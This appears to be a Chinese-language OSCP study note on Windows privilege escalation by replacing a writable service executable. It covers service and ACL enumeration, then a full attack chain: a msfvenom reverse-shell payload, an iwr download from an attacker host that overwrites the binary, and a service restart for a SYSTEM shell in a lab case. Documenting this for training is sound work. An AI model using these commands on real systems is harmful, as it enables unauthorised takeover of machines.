# 💥 服務二進位檔替換提權 (service-binary-replacement)

本文件說明 Windows 環境中「服務二進位檔替換 (Service Binary Replacement)」漏洞的成因、檢測方法與常見的利用與繞過技巧。

---

## 🔍 漏洞成因與原理

在 Windows 系統中，許多系統服務或第三方軟體安裝的服務是以高權限帳戶（如 `NT AUTHORITY\SYSTEM` 或 `LocalSystem`）運行。如果這些服務對應的二進位執行檔（`.exe` 檔案本身）或該檔案所在的父資料夾，其 **存取控制清單 (ACL)** 配置不當，導致普通使用者（如 `BUILTIN\Users` 或 `Authenticated Users`）擁有 **修改 (Modify, M)** 或 **完全控制 (Full Control, F)** 的權限。

攻擊者可以直接使用惡意二進位檔（通常是反彈 Shell payload，例如 `msfvenom` 產生的執行檔）替換原有的服務執行檔。當該服務被重啟（或系統重啟服務自動載入）時，系統便會以 `SYSTEM` 權限執行攻擊者上傳的惡意程式，從而實現本地權限提升。

> [!NOTE]
> 此漏洞與「未受引號包圍的服務路徑 (Unquoted Service Path)」不同。後者是利用路徑解析中的空格截斷與順序搜索；而「服務二進位檔替換」則是直接對服務執行檔具有「寫入/修改」權限，直接進行檔案覆寫或替換。

---

## 🛠️ 常見利用與繞過技巧

### 1. 漏洞檢測 / 資訊收集
首先列出所有非 Windows 系統預設資料夾運行的執行中服務，接著使用 `icacls` 檢查該服務執行檔的 ACL 權限：

*   **列出非 Windows 預設路徑之執行中服務 (PowerShell)**：
    ```powershell
    Get-CimInstance -ClassName win32_service | Select Name,State,StartName,PathName | Where-Object {$_.State -like 'Running' -and $_.PathName -notmatch '^"?C:\\Windows\\'}
    ```
*   **檢查特定執行檔的 ACL 權限**：
    ```cmd
    icacls "C:\Program Files\MilleGPG5\GPGService.exe"
    ```
    *若輸出中包含 `BUILTIN\Users:(M)` 或 `BUILTIN\Users:(F)`，代表普通使用者對該二進位檔有寫入與修改權限。*

*   **服務管理與查詢指令 (sc.exe)**：
    除了 PowerShell，也可以使用 Windows 內建的 `sc.exe` 工具來管理與列舉服務配置：
    ```cmd
    # 1. 查詢服務詳細配置 (Query Config)，查看 BINARY_PATH_NAME 與啟動帳戶
    sc.exe qc <ServiceName>
    
    # 2. 查詢服務當前狀態 (Query State)
    sc.exe query <ServiceName>
    
    # 3. 停止服務
    sc.exe stop <ServiceName>
    
    # 4. 啟動服務
    sc.exe start <ServiceName>
    ```

---

### 2. 基本利用方法
1.  **生成惡意二進位檔 (以反彈 Shell 為例)**：
    使用 `msfvenom` 生成對應架構的惡意服務 execution 檔：
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f exe -o GPGService.exe
    ```
2.  **暫停目標服務**：
    如果目前用戶擁有重啟服務的權限（或者服務允許普通用戶停止）：
    ```powershell
    net stop GPGOrchestrator
    ```
3.  **上傳並替換執行檔**：
    將原有的服務執行檔備份後，用惡意的 payload 覆蓋它：
    ```powershell
    # 備份原檔案
    move "C:\Program Files\MilleGPG5\GPGService.exe" "C:\Program Files\MilleGPG5\GPGService.exe.bak"
    # 下載或上傳惡意檔案
    iwr http://<KALI_IP>:<HTTP_PORT>/GPGService.exe -o "C:\Program Files\MilleGPG5\GPGService.exe"
    ```
4.  **啟動服務觸發 Payload**：
    ```powershell
    net start GPGOrchestrator
    ```
    在攻擊機端監聽即可收到以 `NT AUTHORITY\SYSTEM` 權限回連的 Shell。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[OSCP-C]]（在獲取普通用戶 `tim` 的 winrm shell 後，列舉系統服務發現 `GPGOrchestrator` 以 `LocalSystem` 權限運行，且普通用戶組對其執行檔 `C:\Program Files\MilleGPG5\GPGService.exe` 具有 `(M)` 修改權限。攻擊者生成同名的 msfvenom shell exe，替換原本的執行檔並利用 `net stop`/`net start` 重啟服務，成功取得系統最高的 `SYSTEM` 權限 Shell）。
